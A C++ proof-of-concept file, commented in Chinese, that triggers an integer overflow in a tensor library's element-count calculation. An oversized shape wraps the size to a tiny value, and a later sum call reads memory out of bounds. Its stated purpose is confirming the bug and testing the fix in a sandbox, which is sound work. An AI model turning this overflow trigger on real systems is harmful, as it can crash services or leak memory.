// (SECURITY_SENSITIVE) CTorch Tensor::numel() / computeStrides() 整数溢出 PoC
// 本地沙箱运行，仅用于验证漏洞存在与修复有效性。
// 禁止用于未授权系统或生产环境。

#include "Tensor.h"
#include <climits>
#include <cstddef>
#include <iostream>
#include <limits>

int main() {
    // 构造 shape 使 numel() 在 size_t 上回绕为极小值，绕过 Storage 的 overflow 检查。
    // (SIZE_MAX/2 + 1) * 2 = SIZE_MAX + 2 ≡ 2 (mod 2^64)
    size_t big_dim = std::numeric_limits<size_t>::max() / 2 + 1;
    std::vector<size_t> shape = {2, big_dim};

    std::cout << "[PoC] requested shape: {2, " << big_dim << "}" << std::endl;

    // zero_init=false 避免构造期触发其他路径
    Tensor t(ShapeTag{}, shape, DType::kFloat, DeviceType::kCPU, /*zero_init=*/false);

    std::cout << "[PoC] tensor numel (after wrap): " << t.numel() << std::endl;
    std::cout << "[PoC] triggering out-of-bounds read via sum(1)..." << std::endl;

    // sum(1) 内部使用 _strides[1] * _shape[1] 计算 pre_dim_stride；
    // 由于 stride[1] = 1，读取第 1 行时会访问 index = big_dim，
    // 远超实际分配的 0/极小 storage，触发 heap-buffer-overflow / 越界访问。
    Tensor s = t.sum(1);

    std::cout << "[PoC] finished (should not reach here if ASan is active)" << std::endl;
    return 0;
}
